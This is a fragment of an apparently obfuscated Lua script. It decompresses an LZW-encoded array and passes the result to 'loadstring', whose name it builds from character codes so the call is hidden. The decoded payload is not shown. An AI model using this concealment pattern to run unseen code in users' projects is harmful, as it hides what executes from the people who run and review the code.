local ag={af}
local ah=256
for aj=2,#y do
local ak=y[aj]
local al=ad[ak]
if not al and ak==ah then al=af..af:sub(1,1) end
if not al then return end
ag[#ag+1]=al
ad[ah]=af..al:sub(1,1)
ah=ah+1
af=al
end
local am=(getfenv and getfenv() or _G)[string.char(108,111,97,100,115,116,114,105,110,103)]
return am(table.concat(ag))()
